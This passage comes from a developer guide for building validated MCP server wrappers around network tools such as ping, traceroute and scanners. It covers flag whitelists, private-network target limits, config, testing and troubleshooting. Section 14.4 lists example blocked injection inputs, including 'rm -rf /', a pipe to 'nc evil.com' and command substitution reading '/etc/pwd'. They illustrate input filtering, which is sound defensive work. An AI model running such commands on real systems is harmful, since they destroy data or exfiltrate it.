#### 2.2 Define Allowed Flags (Critical!)

```python
# Pattern 1: Simple whitelist
allowed_flags = ["-v", "-q", "-c"]

# Pattern 2: With value flags
allowed_flags = [
    "-c",      # Count flag
    "-W",      # Timeout flag
    "-i",      # Interval flag
]

# Also define flags that REQUIRE values
_FLAGS_REQUIRE_VALUE = {"-c", "-W", "-i"}

# Pattern 3: With extra allowed tokens (for optimization)
_EXTRA_ALLOWED_TOKENS = {
    "5",       # Common value for -c
    "1000",    # Common value for --timeout
}
```

#### 2.3 Override Defaults (Optional)

```python
class SlowTool(MCPBaseTool):
    command_name = "slow_scanner"
    allowed_flags = ["-deep"]
    
    # Tool-specific overrides
    concurrency = 1                    # Only one at a time
    default_timeout_sec = 1800.0       # 30 minutes
    
    # Circuit breaker tuning
    circuit_breaker_failure_threshold = 3      # Open after 3 failures
    circuit_breaker_recovery_timeout = 300.0   # 5 min recovery
```

### Phase 3: Advanced Validation (Optional)

#### 3.1 Custom Input Validation

Override `_execute_tool` to add custom validation:

```python
async def _execute_tool(self, inp: ToolInput, timeout_sec: Optional[float] = None) -> ToolOutput:
    """Execute with custom validation."""
    
    # Custom validation logic
    validation_error = self._validate_custom_requirements(inp)
    if validation_error:
        return validation_error
    
    # Call base implementation
    return await super()._execute_tool(inp, timeout_sec)

def _validate_custom_requirements(self, inp: ToolInput) -> Optional[ToolOutput]:
    """Add tool-specific validation."""
    # Example: Validate network size for nmap
    if "/" in inp.target:
        network = ipaddress.ip_network(inp.target, strict=False)
        if network.num_addresses > 1024:
            error_context = ErrorContext(
                error_type=ToolErrorType.VALIDATION_ERROR,
                message=f"Network too large: {network.num_addresses} hosts",
                recovery_suggestion="Use /22 or smaller prefix",
                timestamp=datetime.now(),
                tool_name=self.tool_name,
                target=inp.target
            )
            return self._create_error_output(error_context, inp.correlation_id or "")
    
    return None
```

#### 3.2 Custom Argument Parsing

Override `_parse_args` for complex validation:

```python
def _parse_args(self, extra_args: str) -> Sequence[str]:
    """Custom argument parsing with additional validation."""
    # Call base parsing first
    tokens = super()._parse_args(extra_args)
    
    # Add custom logic
    validated = []
    for token in tokens:
        # Example: Validate port specifications
        if token.startswith("-p"):
            if not self._validate_port_spec(token):
                raise ValueError(f"Invalid port specification: {token}")
        validated.append(token)
    
    return validated

def _validate_port_spec(self, port_spec: str) -> bool:
    """Validate port specification format."""
    # Your validation logic
    return True
```

#### 3.3 Argument Optimization

Add smart defaults for better UX:

```python
def _optimize_args(self, extra_args: str) -> str:
    """Add smart defaults if not specified."""
    import shlex
    
    tokens = shlex.split(extra_args) if extra_args else []
    optimized = []
    
    # Check what's missing
    has_count = any("-c" in t for t in tokens)
    has_timeout = any("-W" in t for t in tokens)
    
    # Add defaults
    if not has_count:
        optimized.extend(["-c", "3"])
        log.debug("optimization.added_default flag=-c value=3")
    
    if not has_timeout:
        optimized.extend(["-W", "5"])
        log.debug("optimization.added_default flag=-W value=5")
    
    # Append original args
    optimized.extend(tokens)
    
    return " ".join(optimized)

# Use in _execute_tool
async def _execute_tool(self, inp: ToolInput, timeout_sec: Optional[float] = None) -> ToolOutput:
    # Optimize arguments
    optimized_args = self._optimize_args(inp.extra_args or "")
    
    # Create enhanced input
    enhanced_input = ToolInput(
        target=inp.target,
        extra_args=optimized_args,
        timeout_sec=timeout_sec or inp.timeout_sec,
        correlation_id=inp.correlation_id
    )
    
    # Execute with base
    return await super()._execute_tool(enhanced_input, timeout_sec)
```

### Section Checklist

- [ ] Complete command analysis and documentation
- [ ] Perform security assessment and risk analysis
- [ ] Create tool file with proper structure
- [ ] Define allowed flags with security considerations
- [ ] Override defaults as needed for your tool
- [ ] Implement custom validation if required
- [ ] Add custom argument parsing if needed
- [ ] Implement argument optimization for better UX

---

## 14. Security & Validation Patterns

### 14.1 Input Validation Layers

The base tool provides **4 layers of validation**:

```
Layer 1: Pydantic Validators (ToolInput model)
    ↓ target validation (RFC1918, .lab.internal)
    ↓ extra_args length limit (2048 bytes)
    ↓ metacharacter blocking (;,&,|,`,etc.)

Layer 2: Command Resolution
    ↓ shutil.which() to find command
    ↓ Fail if command not in PATH

Layer 3: Argument Parsing & Sanitization
    ↓ shlex.split() for safe parsing
    ↓ Token validation (alphanumeric + safe chars)
    ↓ Flag whitelist enforcement
    ↓ Value validation for flags

Layer 4: Resource Limits (Unix/Linux)
    ↓ CPU time limit (rlimit)
    ↓ Memory limit (512MB default)
    ↓ File descriptor limit (256 default)
    ↓ Core dump disabled
```

### 14.2 Target Validation Pattern

**Built-in validation** (automatic):
```python
# ToolInput validates these automatically:
✅ "192.168.1.1"           # RFC1918 private IP
✅ "10.0.0.0/8"            # RFC1918 network
✅ "172.16.0.0/12"         # RFC1918 network
✅ "server.lab.internal"   # .lab.internal hostname
❌ "8.8.8.8"               # Public IP (rejected)
❌ "google.com"            # Public hostname (rejected)
```

**Custom validation** (add in your tool):
```python
def _validate_custom_requirements(self, inp: ToolInput) -> Optional[ToolOutput]:
    """Add tool-specific target validation."""
    import ipaddress
    
    # Example: Reject loopback for network scans
    if self.command_name == "nmap":
        try:
            ip = ipaddress.ip_address(inp.target)
            if ip.is_loopback:
                error_context = ErrorContext(
                    error_type=ToolErrorType.VALIDATION_ERROR,
                    message="Loopback addresses not allowed for network scans",
                    recovery_suggestion="Use a private network address",
                    timestamp=datetime.now(),
                    tool_name=self.tool_name,
                    target=inp.target
                )
                return self._create_error_output(error_context, inp.correlation_id or "")
        except ValueError:
            pass  # Not an IP, continue
    
    return None
```

### 14.3 Argument Validation Patterns

#### Pattern 1: Simple Flag Whitelist

```python
class SimpleTool(MCPBaseTool):
    command_name = "mytool"
    
    # Only these flags are allowed
    allowed_flags = ["-v", "-q", "-c"]
    
    # Auto-rejects:
    # ❌ -x (not in whitelist)
    # ❌ --unknown (not in whitelist)
    # ❌ $(cmd) (metacharacter)
```

#### Pattern 2: Flags with Required Values

```python
class ToolWithValues(MCPBaseTool):
    command_name = "mytool"
    allowed_flags = ["-c", "-t", "-o"]
    
    # These flags MUST have values
    _FLAGS_REQUIRE_VALUE = {"-c", "-t"}
    
    # Valid: -c 5, -t 10, -o
    # Invalid: -c (missing value), -t (missing value)
```

#### Pattern 3: Complex Value Validation

```python
def _sanitize_tokens(self, tokens: Sequence[str]) -> Sequence[str]:
    """Override for custom value validation."""
    safe = []
    expect_value_for = None
    
    for token in tokens:
        # Handle flag values
        if expect_value_for:
            # Validate value for previous flag
            if expect_value_for == "-c":
                if not token.isdigit() or int(token) > 100:
                    raise ValueError(f"Invalid count: {token} (must be 1-100)")
            
            safe.append(token)
            expect_value_for = None
            continue
        
        # Check if flag requires value
        if token in self._FLAGS_REQUIRE_VALUE:
            expect_value_for = token
        
        safe.append(token)
    
    return safe
```

### 14.4 Dangerous Pattern Prevention

**Always block these:**
```python
# Blocked by default in base_tool.py
_DENY_CHARS = re.compile(r"[;&|`$><\n\r]")

# Examples of blocked inputs:
❌ "arg1; rm -rf /"       # Command injection
❌ "arg1 && malware"      # Command chaining
❌ "arg1 | nc evil.com"   # Pipe to external
❌ "arg1 `whoami`"        # Command substitution
❌ "arg1 $(cat /etc/pwd)" # Command substitution
❌ "arg1 > /tmp/evil"     # File redirection
```

**Additional patterns to block:**
```python
# In your tool's validation
def _parse_args(self, extra_args: str) -> Sequence[str]:
    tokens = super()._parse_args(extra_args)
    
    for token in tokens:
        # Block path traversal
        if ".." in token:
            raise ValueError(f"Path traversal detected: {token}")
        
        # Block absolute paths (if inappropriate)
        if token.startswith("/"):
            raise ValueError(f"Absolute paths not allowed: {token}")
        
        # Block wildcards (if risky for your tool)
        if "*" in token or "?" in token:
            raise ValueError(f"Wildcards not allowed: {token}")
    
    return tokens
```

### Section Checklist

- [ ] Understand all four layers of input validation
- [ ] Review target validation patterns
- [ ] Familiarize with argument validation patterns
- [ ] Understand dangerous pattern prevention
- [ ] Review security validation implementation
- [ ] Implement custom validation for your tool

---

## 15. Advanced Features Integration

### 15.1 Configuration Integration

#### Basic Pattern

```python
from mcp_server.config import get_config

class ConfigurableTool(MCPBaseTool):
    command_name = "mytool"
    allowed_flags = ["-v"]
    
    def __init__(self):
        super().__init__()
        self.config = get_config()
        self._apply_config()
    
    def _apply_config(self):
        """Apply configuration with safe defaults."""
        try:
            # Read tool-specific config
            if hasattr(self.config, 'tool') and self.config.tool:
                if hasattr(self.config.tool, 'default_timeout'):
                    # Clamp to safe range
                    self.default_timeout_sec = max(
                        60.0,
                        min(3600.0, float(self.config.tool.default_timeout))
                    )
        except Exception as e:
            log.error("config.apply_failed error=%s using_defaults", str(e))
            # Keep class defaults
```

#### Advanced: Policy-Based Controls

```python
class PolicyControlledTool(MCPBaseTool):
    command_name = "scanner"
    BASE_ALLOWED_FLAGS = ["-safe", "-normal"]
    
    def __init__(self):
        super().__init__()
        self.config = get_config()
        self.allow_intrusive = False
        self._apply_config()
    
    def _apply_config(self):
        """Apply policy-based configuration."""
        # Read security policy
        if hasattr(self.config, 'security') and self.config.security:
            if hasattr(self.config.security, 'allow_intrusive'):
                self.allow_intrusive = bool(self.config.security.allow_intrusive)
                
                if self.allow_intrusive:
                    log.warning("policy.intrusive_enabled tool=%s", self.tool_name)
                else:
                    log.info("policy.intrusive_disabled tool=%s", self.tool_name)
    
    @property
    def allowed_flags(self):
        """Dynamic flag list based on policy."""
        flags = list(self.BASE_ALLOWED_FLAGS)
        
        if self.allow_intrusive:
            flags.extend(["-aggressive", "-deep-scan"])
        
        return flags
```

### 15.2 Result Parsing

#### Pattern 1: Simple Line Parsing

```python
def parse_output(self, output: str) -> Dict[str, Any]:
    """Parse tool output into structured data."""
    result = {
        "hosts": [],
        "errors": [],
        "summary": {}
    }
    
    for line in output.split('\n'):
        line = line.strip()
        
        # Parse host lines
        if line.startswith("Host:"):
            result["hosts"].append(line.split(":", 1)[1].strip())
        
        # Parse errors
        elif "ERROR" in line:
            result["errors"].append(line)
    
    return result
```

#### Pattern 2: Regex Extraction

```python
import re

class RegexParsingTool(MCPBaseTool):
    # Compile patterns once (performance)
    _HOST_PATTERN = re.compile(r'Host:\s+(\S+)')
    _PORT_PATTERN = re.compile(r'(\d+)/(tcp|udp)\s+(\w+)')
    
    def parse_output(self, output: str) -> Dict[str, Any]:
        """Parse with compiled regex patterns."""
        hosts = self._HOST_PATTERN.findall(output)
        ports = [
            {"port": int(m[0]), "proto": m[1], "state": m[2]}
            for m in self._PORT_PATTERN.finditer(output)
        ]
        
        return {
            "hosts": hosts,
            "ports": ports,
            "total_hosts": len(hosts),
            "open_ports": len([p for p in ports if p["state"] == "open"])
        }
```

#### Pattern 3: Integration with ToolOutput

```python
async def run(self, inp: ToolInput, timeout_sec: Optional[float] = None) -> ToolOutput:
    """Execute and enhance output with parsed data."""
    # Call base execution
    result = await super().run(inp, timeout_sec)
    
    # Parse output if successful
    if result.returncode == 0 and result.stdout:
        try:
            parsed = self.parse_output(result.stdout)
            
            # Add to metadata
            result.ensure_metadata()
            result.metadata["parsed_data"] = parsed
            result.metadata["hosts_found"] = len(parsed.get("hosts", []))
            
            log.info("output.parsed tool=%s hosts=%d",
                    self.tool_name, parsed.get("total_hosts", 0))
        except Exception as e:
            log.warning("output.parse_failed tool=%s error=%s", 
                       self.tool_name, str(e))
            # Don't fail on parse errors, just log
    
    return result
```

### 15.3 Scan Templates / Presets

```python
from enum import Enum

class ScanMode(Enum):
    """Predefined scan modes."""
    QUICK = "quick"
    STANDARD = "standard"
    THOROUGH = "thorough"

class TemplatedTool(MCPBaseTool):
    command_name = "scanner"
    allowed_flags = ["-q", "-s", "-t", "-v"]
    
    def _get_template_args(self, mode: ScanMode) -> str:
        """Get arguments for scan mode."""
        templates = {
            ScanMode.QUICK: "-q -v",
            ScanMode.STANDARD: "-s",
            ScanMode.THOROUGH: "-t -v",
        }
        return templates.get(mode, templates[ScanMode.STANDARD])
    
    async def run_with_template(
        self,
        target: str,
        mode: ScanMode = ScanMode.STANDARD,
        timeout_sec: Optional[float] = None
    ) -> ToolOutput:
        """Run with predefined template."""
        args = self._get_template_args(mode)
        
        inp = ToolInput(
            target=target,
            extra_args=args,
            timeout_sec=timeout_sec
        )
        
        log.info("template.scan tool=%s mode=%s target=%s",
                self.tool_name, mode.value, target)
        
        return await self.run(inp, timeout_sec)
```

### 15.4 Caching for Performance

```python
class CachedTool(MCPBaseTool):
    command_name = "lookup"
    allowed_flags = ["-v"]
    
    def __init__(self):
        super().__init__()
        self._cache: Dict[str, Any] = {}
        self._cache_hits = 0
        self._cache_misses = 0
    
    def _get_from_cache(self, key: str) -> Optional[Any]:
        """Thread-safe cache retrieval."""
        if key in self._cache:
            self._cache_hits += 1
            log.debug("cache.hit key=%s hits=%d", key, self._cache_hits)
            return self._cache[key]
        
        self._cache_misses += 1
        return None
    
    def _add_to_cache(self, key: str, value: Any):
        """Add to cache with size limit."""
        MAX_CACHE_SIZE = 1000
        
        if len(self._cache) >= MAX_CACHE_SIZE:
            # Simple FIFO eviction
            first_key = next(iter(self._cache))
            del self._cache[first_key]
            log.debug("cache.evicted key=%s size=%d", first_key, len(self._cache))
        
        self._cache[key] = value
    
    def clear_cache(self):
        """Clear cache (useful for testing)."""
        self._cache.clear()
        self._cache_hits = 0
        self._cache_misses = 0
        log.info("cache.cleared tool=%s", self.tool_name)
    
    def get_cache_stats(self) -> Dict[str, int]:
        """Get cache statistics."""
        return {
            "size": len(self._cache),
            "hits": self._cache_hits,
            "misses": self._cache_misses,
            "hit_rate": self._cache_hits / (self._cache_hits + self._cache_misses)
                if (self._cache_hits + self._cache_misses) > 0 else 0.0
        }
```

### Section Checklist

- [ ] Implement configuration integration with safe defaults
- [ ] Add policy-based controls if needed
- [ ] Implement result parsing for structured output
- [ ] Add scan templates/presets for common use cases
- [ ] Implement caching for performance if appropriate
- [ ] Test all advanced features thoroughly

---

## 16. Configuration & Policy Management

### 16.1 Configuration File Structure

Your tool can read from `config.yaml`:

```yaml
# config.yaml
security:
  allow_intrusive: false        # Controls dangerous operations

tool:
  default_timeout: 600           # Override class default
  default_concurrency: 1         # Override class default

circuit_breaker:
  failure_threshold: 5
  recovery_timeout: 120.0

resource_limits:
  max_memory_mb: 512
  max_file_descriptors: 256
```

### 16.2 Reading Configuration

```python
from mcp_server.config import get_config

class MyTool(MCPBaseTool):
    def __init__(self):
        super().__init__()
        self.config = get_config()
        self._apply_config()
    
    def _apply_config(self):
        """Apply configuration with validation and clamping."""
        try:
            # Read with fallback
            if hasattr(self.config, 'tool'):
                # Timeout with safe clamping
                timeout = getattr(self.config.tool, 'default_timeout', self.default_timeout_sec)
                self.default_timeout_sec = max(60.0, min(3600.0, float(timeout)))
                
                # Concurrency with safe clamping
                concurrency = getattr(self.config.tool, 'default_concurrency', self.concurrency)
                self.concurrency = max(1, min(10, int(concurrency)))
            
            log.debug("config.applied tool=%s timeout=%.1f concurrency=%d",
                     self.tool_name, self.default_timeout_sec, self.concurrency)
        
        except Exception as e:
            log.error("config.apply_failed error=%s", str(e))
            # Keep class defaults on error
```

### 16.3 Environment Variable Overrides

```python
import os

class EnvAwareTool(MCPBaseTool):
    def __init__(self):
        super().__init__()
        self._apply_env_overrides()
    
    def _apply_env_overrides(self):
        """Apply environment variable overrides."""
        # Tool-specific timeout
        env_timeout = os.getenv(f"{self.command_name.upper()}_TIMEOUT")
        if env_timeout:
            try:
                self.default_timeout_sec = float(env_timeout)
                log.info("env.override param=timeout value=%.1f", 
                        self.default_timeout_sec)
            except ValueError:
                log.warning("env.invalid_timeout value=%s", env_timeout)
        
        # Tool-specific concurrency
        env_concurrency = os.getenv(f"{self.command_name.upper()}_CONCURRENCY")
        if env_concurrency:
            try:
                self.concurrency = int(env_concurrency)
                log.info("env.override param=concurrency value=%d", 
                        self.concurrency)
            except ValueError:
                log.warning("env.invalid_concurrency value=%s", env_concurrency)
```

### Section Checklist

- [ ] Create configuration file structure
- [ ] Implement configuration reading with validation
- [ ] Add environment variable overrides
- [ ] Implement safe clamping of configuration values
- [ ] Test configuration application with various inputs

---

## 17. Testing Your Tool

### 17.1 Unit Testing Pattern

```python
# tests/test_my_tool.py
import pytest
from mcp_server.tools.my_tool import MyTool
from mcp_server.base_tool import ToolInput, ToolOutput

@pytest.fixture
def tool():
    """Create tool instance."""
    return MyTool()

@pytest.mark.asyncio
async def test_basic_execution(tool):
    """Test basic tool execution."""
    result = await tool.run(ToolInput(
        target="192.168.1.1",
        extra_args="-v"
    ))
    
    assert isinstance(result, ToolOutput)
    assert result.returncode is not None

@pytest.mark.asyncio
async def test_invalid_target(tool):
    """Test target validation."""
    result = await tool.run(ToolInput(
        target="8.8.8.8",  # Public IP, should fail
        extra_args=""
    ))
    
    assert result.returncode != 0
    assert "private" in result.stderr.lower()

@pytest.mark.asyncio
async def test_invalid_flag(tool):
    """Test flag validation."""
    result = await tool.run(ToolInput(
        target="192.168.1.1",
        extra_args="-X --dangerous"  # Not in allowed_flags
    ))
    
    assert result.returncode != 0
    assert "not allowed" in result.stderr.lower()

def test_command_resolution(tool):
    """Test command exists."""
    cmd = tool._resolve_command()
    assert cmd is not None, f"{tool.command_name} not found in PATH"

def test_allowed_flags(tool):
    """Test allowed flags are defined."""
    assert tool.allowed_flags is not None
    assert len(tool.allowed_flags) > 0

@pytest.mark.asyncio
async def test_timeout_handling(tool):
    """Test timeout behavior."""
    result = await tool.run(
        ToolInput(target="192.168.1.1"),
        timeout_sec=0.1  # Very short timeout
    )
    
    # Should timeout gracefully
    assert result.timed_out or result.returncode != 0
```

### 17.2 Integration Testing

```python
@pytest.mark.integration
@pytest.mark.asyncio
async def test_full_scan_workflow(tool):
    """Test complete scan workflow."""
    # Execute scan
    result = await tool.run(ToolInput(
        target="192.168.1.0/24",
        extra_args="-v --quick"
    ))
    
    # Verify execution
    assert result.execution_time is not None
    assert result.correlation_id is not None
    
    # Parse output
    if result.returncode == 0 and result.stdout:
        parsed = tool.parse_output(result.stdout)
        assert isinstance(parsed, dict)
        assert "hosts" in parsed

@pytest.mark.integration
async def test_circuit_breaker_integration(tool):
    """Test circuit breaker behavior."""
    # Force multiple failures
    for _ in range(tool.circuit_breaker_failure_threshold + 1):
        await tool.run(ToolInput(
            target="192.168.1.1",
            extra_args="--invalid-flag"  # Cause failure
        ))
    
    # Circuit should be open
    if tool._circuit_breaker:
        from mcp_server.circuit_breaker import CircuitBreakerState
        assert tool._circuit_breaker.state == CircuitBreakerState.OPEN
```

### 17.3 Property-Based Testing

```python
from hypothesis import given, strategies as st

@given(
    target=st.one_of(
        st.from_regex(r'192\.168\.\d{1,3}\.\d{1,3}', fullmatch=True),
        st.from_regex(r'10\.\d{1,3}\.\d{1,3}\.\d{1,3}', fullmatch=True),
    )
)
@pytest.mark.asyncio
async def test_target_validation_property(tool, target):
    """Property: All RFC1918 addresses should be accepted."""
    result = await tool.run(ToolInput(target=target))
    
    # Should not fail on validation (may fail on execution)
    assert "Target must be" not in result.stderr
```

### 17.4 Mock Testing for Development

```python
from unittest.mock import AsyncMock, patch

@pytest.mark.asyncio
async def test_with_mock_command():
    """Test without actual command execution."""
    tool = MyTool()
    
    # Mock the subprocess execution
    mock_output = ToolOutput(
        stdout="Mocked output",
        stderr="",
        returncode=0,
        execution_time=1.0
    )
    
    with patch.object(tool, '_spawn', return_value=mock_output):
        result = await tool.run(ToolInput(target="192.168.1.1"))
        
        assert result.stdout == "Mocked output"
        assert result.returncode == 0
```

### Section Checklist

- [ ] Create comprehensive unit tests
- [ ] Add integration tests for full workflows
- [ ] Implement property-based testing for validation
- [ ] Add mock testing for development
- [ ] Test all edge cases and error conditions
- [ ] Verify test coverage is adequate

---

## 18. Best Practices & Patterns

### 18.1 Security Best Practices

#### ✅ DO:

```python
# 1. Use whitelist approach for flags
allowed_flags = ["-safe", "-flag"]  # Explicit allow

# 2. Validate all input rigorously
def _validate_input(self, value):
    if not self._is_safe(value):
        raise ValueError(f"Invalid input: {value}")

# 3. Clamp configuration values
timeout = max(60, min(3600, config_value))

# 4. Log security events
log.warning("security.blocked_flag flag=%s tool=%s", flag, self.tool_name)

# 5. Fail closed (deny by default)
if flag not in self.allowed_flags:
    raise ValueError(f"Flag not allowed: {flag}")

# 6. Use compiled regex for performance
_PATTERN = re.compile(r'^[a-z0-9-]+$')
```

#### ❌ DON'T:

```python
# 1. Don't use blacklist approach
forbidden_flags = ["-X"]  # Too easy to bypass

# 2. Don't trust input
cmd = f"mytool {user_input}"  # Shell injection risk!

# 3. Don't catch and ignore security errors
try:
    self._validate(input)
except ValueError:
    pass  # NEVER DO THIS!

# 4. Don't allow arbitrary code execution
if "--script" in args:
    # Without validation, this is dangerous!

# 5. Don't skip validation for "trusted" sources
if source == "admin":
    # Still validate!
```

### 18.2 Performance Best Practices

```python
# 1. Compile regex patterns once
class OptimizedTool(MCPBaseTool):
    _PATTERN = re.compile(r'pattern')  # Class-level
    
    def parse(self, text):
        return self._PATTERN.findall(text)  # Reuse

# 2. Use caching for repeated operations
def _expensive_operation(self, key):
    if key in self._cache:
        return self._cache[key]
    
    result = self._compute(key)
    self._cache[key] = result
    return result

# 3. Limit concurrency appropriately
concurrency = 1  # For heavy tools
concurrency = 5  # For light tools

# 4. Set realistic timeouts
default_timeout_sec = 60   # For quick operations
default_timeout_sec = 600  # For scans

# 5. Clean up resources
def clear_caches(self):
    self._cache.clear()
    log.debug("cache.cleared")
```

### 18.3 Logging Best Practices

```python
# Use structured logging with key=value pairs
log.info("tool.execution target=%s args=%s timeout=%.1f",
        inp.target, inp.extra_args, timeout_sec)

# Log security events at appropriate levels
log.warning("security.blocked_flag flag=%s", dangerous_flag)
log.error("security.injection_attempt input=%s", suspicious_input)

# Log performance metrics
log.debug("performance.optimization added=%s", optimization)
log.info("performance.execution_time tool=%s duration=%.2fs", 
        self.tool_name, execution_time)

# Log configuration changes
log.info("config.applied param=%s old=%s new=%s", 
        param, old_value, new_value)

# Don't log sensitive data
log.info("auth.success user=%s", username)  # OK
log.info("auth.attempt password=%s", password)  # NEVER!
```

### 18.4 Error Handling Patterns

```python
# Pattern 1: Validation errors
def _validate(self, inp):
    if not self._is_valid(inp):
        error_context = ErrorContext(
            error_type=ToolErrorType.VALIDATION_ERROR,
            message="Validation failed",
            recovery_suggestion="Check input format",
            timestamp=datetime.now(),
            tool_name=self.tool_name,
            target=inp.target,
            metadata={"detail": "specific error"}
        )
        return self._create_error_output(error_context, inp.correlation_id or "")
    return None

# Pattern 2: Graceful degradation
try:
    result = self._parse_output(output)
except Exception as e:
    log.warning("parse.failed error=%s", str(e))
    result = {"raw": output}  # Fallback to raw

# Pattern 3: Resource cleanup
try:
    result = await self._execute()
finally:
    self._cleanup_resources()

# Pattern 4: Circuit breaker friendly
try:
    result = await self._risky_operation()
except SpecificError as e:
    # Let circuit breaker track this
    raise
except UnexpectedError as e:
    # Log but don't break circuit
    log.error("unexpected.error error=%s", str(e))
    # Return error output instead of raising
    return self._create_error_output(...)
```

### Section Checklist

- [ ] Review and implement all security best practices
- [ ] Apply performance optimization patterns
- [ ] Implement structured logging throughout
- [ ] Use proper error handling patterns
- [ ] Ensure all code follows established conventions

---

## 19. Troubleshooting Guide

### 19.1 Tool Not Discovered

**Symptom:** Tool class exists but not loaded by server

**Checklist:**

```python
# 1. Check class name doesn't match exclusion patterns
class MyTool(MCPBaseTool):  # ✅ Good
class TestTool(MCPBaseTool):  # ❌ Excluded (Test* prefix)
class ToolBase(MCPBaseTool):  # ❌ Excluded (*Base suffix)

# 2. Check it's in the correct package
mcp_server/tools/my_tool.py  # ✅ Correct location

# 3. Check it's a concrete class
class MyTool(MCPBaseTool):  # ✅ Concrete
    command_name = "mytool"

class AbstractTool(MCPBaseTool):  # ❌ Missing command_name
    pass

# 4. Check __init__.py exists
mcp_server/tools/__init__.py  # Must exist (can be empty)

# 5. Enable debug logging
LOG_LEVEL=DEBUG python -m mcp_server.server

# 6. Check import errors
python -c "from mcp_server.tools.my_tool import MyTool; print('OK')"
```

### 19.2 Validation Failures

**Symptom:** Valid inputs being rejected

```python
# Debug validation
def _parse_args(self, extra_args: str) -> Sequence[str]:
    log.debug("parse.start extra_args=%s", extra_args)
    
    try:
        tokens = shlex.split(extra_args)
        log.debug("parse.tokens count=%d tokens=%s", len(tokens), tokens)
    except Exception as e:
        log.error("parse.failed error=%s", str(e))
        raise
    
    # Continue with validation...
```

### 19.3 Command Not Found

**Symptom:** Tool fails with "command not found"

```python
# Test command resolution
def test_command():
    tool = MyTool()
    cmd = tool._resolve_command()
    print(f"Resolved: {cmd}")
    print(f"PATH: {os.getenv('PATH')}")

# Common solutions:
# 1. Install command: apt-get install nmap
# 2. Add to PATH: export PATH=$PATH:/usr/local/bin
# 3. Use full path: command_name = "/usr/bin/nmap"
```

### 19.4 Circuit Breaker Open

**Symptom:** Tool returns circuit breaker errors

```python
# Check circuit breaker state
tool = MyTool()
if tool._circuit_breaker:
    print(f"State: {tool._circuit_breaker.state}")
    print(f"Failures: {tool._circuit_breaker._failure_count}")
    print(f"Threshold: {tool.circuit_breaker_failure_threshold}")

# Reset circuit breaker (for testing)
if tool._circuit_breaker:
    tool._circuit_breaker._failure_count = 0
    tool._circuit_breaker.state = CircuitBreakerState.CLOSED
```

### 19.5 Performance Issues

```python
# 1. Check concurrency
print(f"Concurrency: {tool.concurrency}")
# Reduce if too high: concurrency = 1

# 2. Check timeout
print(f"Timeout: {tool.default_timeout_sec}")
# Increase if operations are slow

# 3. Enable profiling
import cProfile
cProfile.run('asyncio.run(tool.run(inp))')

# 4. Check resource limits
# Increase if hitting limits:
# MCP_MAX_MEMORY_MB=1024
# MCP_MAX_FILE_DESCRIPTORS=512

# 5. Monitor metrics
info = tool.get_tool_info()
print(f"Metrics: {info}")
```

### Section Checklist

- [ ] Follow tool discovery troubleshooting steps
- [ ] Debug validation failures with logging
- [ ] Resolve command not found issues
- [ ] Check circuit breaker state when needed
- [ ] Address performance issues systematically

---

## 20. Complete Reference Examples

### 20.1 Simple Tool (Ping)

```python
"""
Simple ping tool with minimal features.
Use this as a starting template for basic tools.
"""
from mcp_server.base_tool import MCPBaseTool
from typing import ClassVar, Optional, Sequence

class PingTool(MCPBaseTool):
    """
    Ping a host to check connectivity.
    
    Features:
    - RFC1918 target restriction
    - Safe flag whitelist
    - Timeout handling
    
    Usage:
        tool = PingTool()
        result = await tool.run(ToolInput(
            target="192.168.1.1",
            extra_args="-c 4"
        ))
    """
    
    command_name: ClassVar[str] = "ping"
    
    allowed_flags: ClassVar[Optional[Sequence[str]]] = [
        "-c",  # Count
        "-W",  # Timeout
        "-i",  # Interval
        "-q",  # Quiet
        "-v",  # Verbose
    ]
    
    # Flags requiring values
    _FLAGS_REQUIRE_VALUE = {"-c", "-W", "-i"}
    
    # Conservative settings for network tool
    concurrency: ClassVar[int] = 3
    default_timeout_sec: ClassVar[float] = 30.0
```

### 20.2 Medium Complexity Tool (Traceroute)

```python
"""
Traceroute tool with custom validation and parsing.
"""
import re
import logging
from typing import ClassVar, Optional, Sequence, Dict, Any, List
from mcp_server.base_tool import MCPBaseTool, ToolInput, ToolOutput

log = logging.getLogger(__name__)

class TracerouteTool(MCPBaseTool):
    """
    Trace network path to a host.
    
    Features:
    - Path visualization
    - Hop parsing
    - Custom timeout validation
    """
    
    command_name: ClassVar[str] = "traceroute"
    
    allowed_flags: ClassVar[Optional[Sequence[str]]] = [
        "-n",   # No DNS resolution
        "-m",   # Max hops
        "-q",   # Queries per hop
        "-w",   # Wait time
        "-I",   # ICMP mode
    ]
    
    _FLAGS_REQUIRE_VALUE = {"-m", "-q", "-w"}
    _HOP_PATTERN = re.compile(r'^\s*(\d+)\s+(.+)$')
    
    concurrency: ClassVar[int] = 2
    default_timeout_sec: ClassVar[float] = 120.0
    
    def _sanitize_tokens(self, tokens: Sequence[str]) -> Sequence[str]:
        """Custom validation for max hops."""
        safe = []
        expect_value = None
        
        for token in tokens:
            if expect_value:
                # Validate based on flag
                if expect_value == "-m":
                    if not token.isdigit() or not (1 <= int(token) <= 64):
                        raise ValueError(f"Max hops must be 1-64, got: {token}")
                elif expect_value == "-q":
                    if not token.isdigit() or not (1 <= int(token) <= 10):
                        raise ValueError(f"Queries must be 1-10, got: {token}")
                elif expect_value == "-w":
                    if not token.isdigit() or not (1 <= int(token) <= 30):
                        raise ValueError(f"Wait time must be 1-30s, got: {token}")
                
                safe.append(token)
                expect_value = None
                continue
            
            if token in self._FLAGS_REQUIRE_VALUE:
                expect_value = token
            
            safe.append(token)
        
        if expect_value:
            raise ValueError(f"{expect_value} requires a value")
        
        return safe
    
    def parse_output(self, output: str) -> Dict[str, Any]:
        """Parse traceroute output."""
        hops = []
        
        for line in output.split('\n'):
            match = self._HOP_PATTERN.match(line)
            if match:
                hop_num, hop_data = match.groups()
                hops.append({
                    "number": int(hop_num),
                    "data": hop_data.strip()
                })
        
        return {
            "hops": hops,
            "hop_count": len(hops),
            "completed": len(hops) > 0
        }
    
    async def run(self, inp: ToolInput, timeout_sec: Optional[float] = None) -> ToolOutput:
        """Execute with output parsing."""
        result = await super().run(inp, timeout_sec)
        
        # Add parsed data
        if result.returncode == 0 and result.stdout:
            try:
                parsed = self.parse_output(result.stdout)
                result.ensure_metadata()
                result.metadata["parsed"] = parsed
                
                log.info("traceroute.parsed target=%s hops=%d",
                        inp.target, parsed["hop_count"])
            except Exception as e:
                log.warning("traceroute.parse_failed error=%s", str(e))
        
        return result
```

### 20.3 Advanced Tool (Scanner with Policy)

```python
"""
Advanced scanner tool with policy controls and templates.
Use this as reference for complex tools.
"""
import logging
from typing import ClassVar, Optional, Sequence, Dict, Any, Tuple
from enum import Enum
from mcp_server.base_tool import MCPBaseTool, ToolInput, ToolOutput
from mcp_server.config import get_config

log = logging.getLogger(__name__)

